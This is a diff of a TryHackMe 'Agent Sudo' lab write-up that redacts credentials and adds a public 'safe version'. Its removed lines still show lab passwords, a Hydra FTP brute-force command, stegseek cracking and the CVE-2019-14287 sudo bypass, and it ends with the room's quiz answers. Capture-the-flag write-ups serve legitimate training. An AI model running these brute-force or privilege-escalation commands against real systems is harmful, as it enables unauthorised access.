@@ -19,7 +19,7 @@ This room focused on:
 Started with a service enumeration scan.
 
 ```bash
-nmap -sC -sV 10.67.139.197
+nmap -sC -sV TARGET-IP
 ```
 
 ## Open Ports
@@ -42,7 +42,7 @@ Dear agents,
 Use your own codename as user-agent to access the site.
 
 From,
-Agent R
+Agent <REDACTED>
 ```
 
 This indicated that the website behavior depended on the HTTP User-Agent header.
@@ -54,7 +54,7 @@ This indicated that the website behavior depended on the HTTP User-Agent header.
 Used curl to modify the User-Agent header.
 
 ```bash
-curl -A "R" http://10.67.139.197
+curl -A "R" http://TARGET-IP
 ```
 
 The response changed and showed:
@@ -74,29 +74,29 @@ Tested different User-Agent values.
 Correct request:
 
 ```bash
-curl -A "C" -L 10.67.139.197
+curl -A "C" -L TARGET-IP
 ```
 
 Received hidden message:
 
 ```text
-Attention chris,
+Attention <REDACTED USER>,
 
 Do you still remember our deal?
 Please tell agent J about the stuff ASAP.
 Also, change your password, is weak!
 
 From,
-Agent R
+Agent <REDACTED>
 ```
 
 ## Information Gathered
 
-| Item             | Value         |
-| ---------------- | ------------- |
-| Username         | chris         |
-| Additional Agent | J             |
-| Password Hint    | Weak Password |
+| Item             | Value           |
+| ---------------- | --------------- |
+| Username         | <REDACTED USER> |
+| Additional Agent | J               |
+| Password Hint    | Weak Password   |
 
 ---
 
@@ -105,7 +105,7 @@ Agent R
 Used Hydra against FTP with the discovered username.
 
 ```bash
-hydra -l chris -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt ftp://10.67.139.197 -V
+hydra -l <REDACTED USER> -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt ftp://TARGET-IP -V
 ```
 
 Successfully obtained FTP credentials.
@@ -113,7 +113,7 @@ Successfully obtained FTP credentials.
 Connected to FTP:
 
 ```bash
-ftp 10.67.139.197
+ftp TARGET-IP
 ```
 
 ---
@@ -130,7 +130,7 @@ Files discovered:
 
 ```text
 To_agentJ.txt
-cute-alien.jpg
+cute-<REDACTED PASSWORD>.jpg
 cutie.png
 ```
 
@@ -138,13 +138,13 @@ Downloaded files:
 
 ```bash
 get To_agentJ.txt
-get cute-alien.jpg
+get cute-<REDACTED PASSWORD>.jpg
 get cutie.png
 ```
 
 ---
 
-# Reading Agent J Message
+# Reading Agent <REDACTED> Message
 
 Opened the text file:
 
@@ -157,11 +157,11 @@ Contents:
 ```text
 Dear agent J,
 
-All these alien like photos are fake! Agent R stored the real picture inside your directory.
+All these <REDACTED PASSWORD> like photos are fake! Agent <REDACTED> stored the real picture inside your directory.
 Your login password is somehow stored in the fake picture.
 
 From,
-Agent C
+Agent <REDACTED>
 ```
 
 This strongly suggested steganography.
@@ -201,13 +201,13 @@ The ZIP archive required a password.
 Used stegseek against the JPG image.
 
 ```bash
-stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt
+stegseek cute-<REDACTED PASSWORD>.jpg /usr/share/wordlists/rockyou.txt
 ```
 
 Output:
 
 ```text
-Found passphrase: Area51
+Found passphrase: <REDACTED PASSWORD>
 ```
 
 Extracted hidden file:
@@ -225,36 +225,28 @@ cat message.txt
 Contents:
 
 ```text
-Hi james,
+Hi <REDACTED USER>,
 
-Glad you find this message. Your login password is hackerrules!
+Glad you find this message. Your login password is <REDACTED PASSWORD>
 
 Don't ask me why the password look cheesy, ask agent R who set this password for you.
 
 Your buddy,
-chris
+<REDACTED USER>
 ```
 
-## Credentials Discovered
-
-| User  | Password     |
-| ----- | ------------ |
-| james | hackerrules! |
-
----
-
-# SSH Access
+# SSH Access--
 
 Connected through SSH:
 
 ```bash
-ssh james@10.67.139.197
+ssh <USER>@TARGET-IP
 ```
 
 Password:
 
 ```text
-hackerrules!
+<REDACTED PASSWORD>
 ```
 
 ---
@@ -298,7 +290,7 @@ Output:
 This sudo configuration is vulnerable to:
 
 ```text
-CVE-2019-14287
+CVE-2019-14287 (Publicly Known Sudo Vulnerability)
 ```
 
 ---
@@ -308,7 +300,7 @@ CVE-2019-14287
 Used the sudo UID bypass exploit:
 
 ```bash
-sudo -u#-1 /bin/bash
+<REDACTED PRIVILEGE ESCALATION COMMAND>
 ```
 
 Verified root access:
@@ -370,7 +362,7 @@ gobuster dir -u http://TARGET -w WORDLIST
 ## Curl User-Agent
 
 ```bash
-curl -A "C" TARGET
+curl -A "<REDACTED>" TARGET
 ```
 
 ## Hydra
@@ -412,18 +404,179 @@ sudo -l
 ## Privilege Escalation
 
 ```bash
-sudo -u#-1 /bin/bash
+<REDACTED PRIVILEGE ESCALATION COMMAND>
 ```
+
+---
+
+# Public GitHub / LinkedIn Safe Version
+
+Use this version publicly if you do not want to leak spoilers or sensitive information.
+
+---
+
+# TryHackMe - Agent Sudo Write-Up
+
+## Room Overview
+
+This room focused on:
+
+* Enumeration
+* HTTP Header Manipulation
+* FTP Access
+* Steganography
+* SSH Access
+* Linux Privilege Escalation
+
+---
+
+# Initial Enumeration
+
+Started with an Nmap scan to identify open services.
+
+```bash
+nmap -sC -sV TARGET-IP
+```
+
+## Open Ports
+
+| Port | Service |
+| ---- | ------- |
+| 21   | FTP     |
+| 22   | SSH     |
+| 80   | HTTP    |
+
+---
+
+# Web Enumeration
+
+The webpage contained a clue related to modifying the HTTP User-Agent header.
+
+Used curl to test different User-Agent values:
+
+```bash
+curl -A "<REDACTED>" TARGET-IP
+```
+
+This revealed a hidden message and helped identify a valid username.
+
+---
+
+# FTP Access
+
+Used Hydra with a smaller password wordlist to brute force FTP credentials.
+
+```bash
+hydra -l <REDACTED> -P WORDLIST ftp://TARGET-IP
+```
+
+Successfully obtained FTP access.
+
+---
+
+# FTP Enumeration
+
+Discovered multiple files including:
+
+* text notes
+* image files
+* hidden embedded data
+
+Downloaded the files locally for further analysis.
+
+---
+
+# Steganography & File Analysis
+
+Used:
+
+* binwalk
+* strings
+* stegseek
+* 7z
+
+To identify hidden data inside image files.
+
+```bash
+binwalk -e IMAGE.png
+```
+
+```bash
+stegseek IMAGE.jpg rockyou.txt
+```
+
+Recovered:
+
+* hidden messages
+* additional credentials
+* password clues
+
+---
+
+# SSH Access
+
+Used discovered credentials to access the machine through SSH.
+
+```bash
+ssh USER@TARGET-IP
+```
+
+---
+
+# Privilege Escalation
+
+Enumerated sudo permissions:
+
+```bash
+sudo -l
+```
+
+Identified a vulnerable sudo configuration related to:
+
+```text
+CVE-2019-14287
+```
+
+Escalated privileges successfully and obtained root access.
+
+---
+
+# Skills Practiced
+
+* Nmap Enumeration
+* Gobuster
+* Hydra
+* FTP Enumeration
+* Linux Commands
+* Steganography
+* SSH Access
+* Privilege Escalation
+* CVE Research
+
+---
+
+# Notes
+
+Sensitive information including:
+
+* passwords
+* flags
+* exact credentials
+* target IPs
+* exploit details
+
+have been intentionally redacted.
 
 ---
 
 # Final Answers
 
-| Question                                        | Answer                |
-| ----------------------------------------------- | --------------------- |
-| How did you redirect yourself to a secret page? | User-Agent            |
-| ZIP Password                                    | alien                 |
-| Steg Password                                   | Area51                |
-| Incident Name                                   | Roswell alien autopsy |
-| Privilege Escalation CVE                        | CVE-2019-14287        |
-| Who is Agent R?                                 | DesKel                |
+| Question                                        | Answer                              |
+| ----------------------------------------------- | ----------------------------------- |
+| How did you redirect yourself to a secret page? | User-Agent                          |
+| ZIP Password                                    | <REDACTED>                          |
+| Steg Password                                   | <REDACTED>                          |
+| Incident Name                                   | Roswell <REDACTED PASSWORD> autopsy |
+| Privilege Escalation CVE                        | CVE-2019-14287                      |
+| Who is Agent <REDACTED>?                        | <REDACTED>                          |
+
